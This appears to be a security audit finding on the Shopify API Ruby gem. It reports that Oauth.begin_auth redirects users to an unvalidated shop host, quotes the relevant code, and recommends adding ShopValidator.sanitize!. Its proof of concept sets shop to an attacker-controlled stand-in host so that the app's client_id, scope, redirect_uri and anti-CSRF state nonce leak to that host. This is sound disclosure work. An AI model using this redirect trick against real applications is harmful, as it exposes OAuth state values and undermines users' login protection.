### Title
Unvalidated `shop` parameter in `Oauth.begin_auth` sends the app's `client_id`, requested `scope`, `redirect_uri` and anti-CSRF `state` nonce to an attacker-chosen host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` builds the Shopify authorization URL directly from the caller-supplied `shop` string via `auth_base_uri(shop)`, with no domain validation. Every sibling entry point in the same library that turns a `shop` string into a request target (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`) explicitly calls `Utils::ShopValidator.sanitize!(shop)` first to enforce that `shop` is a genuine `*.myshopify.com`/`*.myshopify.io`/etc. domain. `TokenExchange.exchange_token` similarly never trusts a caller-supplied `shop` at all — it derives the shop from the HMAC-signed JWT `dest` claim. `Oauth.begin_auth`, however, has no equivalent binding or validation. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

### Finding Description
`begin_auth(shop:, redirect_path:, ...)` takes `shop` as a plain, unvalidated string and passes it straight into the private helper `auth_base_uri(shop)`:

```ruby
def auth_base_uri(shop)
  return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")
  ...
end
``` [2](#0-1) 

The resulting `auth_route` is `auth_base_uri(shop) + "/oauth/authorize?#{query_string}"`, where `query_string` includes `client_id`, `scope`, `redirect_uri`, and the freshly generated anti-CSRF `state` nonce:

```ruby
query = {
  client_id: ShopifyAPI::Context.api_key,
  scope: scope.to_s,
  redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
  state: state,
  "grant_options[]": is_online ? "per-user" : "",
}
query_string = URI.encode_www_form(query)
auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"
``` [6](#0-5) 

Because `shop` here has no HMAC or other cryptographic binding yet (this is the very first step of the flow, before Shopify ever signs anything), and there is no call to `Utils::ShopValidator.sanitize!`, an attacker-influenced `shop` value (e.g. taken from a request header such as the documented `request.headers["Shop"]` pattern) is used verbatim to construct the host that the victim's browser is redirected to. Every other place in the gem that turns a `shop` string into a network destination enforces the identity binding "`shop` == a member of `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`" before using it:
- `ClientCredentials.client_credentials` calls `Utils::ShopValidator.sanitize!(shop)` before building the request `base_path` that carries `client_id`/`client_secret`. [7](#0-6) 
- `RefreshToken.refresh_access_token` does the same. [8](#0-7) 
- `TokenExchange.exchange_token` never trusts caller-supplied `shop` — it always uses the `dest` claim from the HMAC-verified session-token JWT. [9](#0-8) 

`Oauth.begin_auth` is the outlier: it neither validates `shop` against the trusted-domain allowlist, nor derives it from a signed source. This breaks the equality that should hold across this gem: `shop used to build the OAuth-authorize redirect target == shop ∈ TRUSTED_SHOPIFY_DOMAINS`.

### Impact Explanation
When `begin_auth` is called with an attacker-controlled `shop` value, the app redirects the user's browser to `https://<attacker-domain>/admin/oauth/authorize?client_id=...&scope=...&redirect_uri=...&state=<nonce>`. This discloses the app's `client_id`, requested `scope`, callback `redirect_uri`, and — critically — the freshly minted anti-CSRF `state` value to a domain the attacker controls (the nonce appears in the URL/Referer sent to that host). Because `validate_auth_callback` treats `state == auth_query.state` as its only defense against forged callbacks, an attacker who learns the `state` value bound to a specific victim's session cookie can attempt to complete/forge the OAuth callback for that victim, undermining the CSRF protection the `state` parameter is meant to provide. This does not by itself directly exfiltrate `client_secret` or an access token (those only flow later, in `validate_auth_callback`, where `shop` IS bound by the Shopify-computed HMAC over the callback query), but it does break the "session fixation / forced OAuth completion" protection that the `state`-cookie mechanism is designed to enforce, since I cannot confirm whether the leaked `state` can be practically weaponized without also controlling the victim's cookie store.

### Likelihood Explanation
Exploitability depends entirely on whether the host application passes attacker-influenced input (header, query param, subdomain, etc.) as the `shop:` argument to `begin_auth` without its own validation. The gem's own documentation shows exactly this pattern (`shop = request.headers["Shop"]` used directly in `begin_auth`) without illustrating any sanitization step, and no validation exists inside the gem for this specific call path — unlike its sibling methods, which do enforce it internally. This is a genuine inconsistency in the library's own code (not merely "the host app ignored documented behavior"), since three parallel methods in the same module explicitly guard against exactly this input.

### Recommendation
Add `shop = Utils::ShopValidator.sanitize!(shop)` (or equivalent) at the top of `Oauth.begin_auth`, mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`, so that the `shop` value used to build `auth_base_uri` is always constrained to `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before it is used to construct any redirect target.

### Proof of Concept
1. A host application built on this gem accepts a `shop` value from an unauthenticated request context (as the gem's own docs suggest, e.g. a header or query param) and forwards it unchanged to `ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback")`.
2. An attacker supplies `shop = "attacker.example"`.
3. `begin_auth` computes `auth_route = "https://attacker.example/admin/oauth/authorize?client_id=...&scope=...&redirect_uri=https://victim-app.example/auth/callback&state=<nonce>&grant_options%5B%5D=per-user"` and sets a `state` cookie containing `<nonce>` in the victim's browser. [10](#0-9) 
4. The victim's browser is redirected (HTTP 307) to `attacker.example`, which now has full visibility into `client_id`, `scope`, `redirect_uri`, and the `state` nonce tied to the victim's session cookie — none of which required knowledge of `Context.api_secret_key`.

I was not able to determine, purely from this gem's code, whether the leaked `state` nonce alone is sufficient to complete a forced-OAuth/session-fixation attack against a specific victim (that also depends on cookie scoping/handling in the host application), so the severity above is stated with that caveat.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L22-52)
```ruby
        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-33)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-51)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
```
